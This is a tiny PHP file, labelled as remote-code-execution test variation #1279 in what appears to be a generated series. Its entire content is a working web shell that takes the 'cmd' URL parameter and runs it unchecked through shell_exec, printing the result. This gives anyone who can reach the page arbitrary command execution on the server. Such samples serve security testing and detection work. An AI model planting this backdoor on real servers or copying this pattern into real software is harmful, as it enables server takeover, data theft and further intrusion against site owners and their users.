<?php
// RCE test variation #1279
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>